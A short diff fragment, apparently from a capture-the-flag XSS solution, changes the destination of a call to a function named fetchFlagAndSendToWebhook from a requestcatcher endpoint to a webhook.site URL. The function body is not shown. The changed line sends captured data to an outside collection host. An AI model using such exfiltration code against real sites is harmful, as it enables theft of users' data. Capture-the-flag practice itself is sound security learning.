@@ -17,4 +17,4 @@ async function fetchFlagAndSendToWebhook(webhookUrl) {
   }
 }
 
-fetchFlagAndSendToWebhook('https://xss.requestcatcher.com/test');
+fetchFlagAndSendToWebhook('https://webhook.site/804c6227-d9a7-4ae4-9a58-c94a51ae5912');
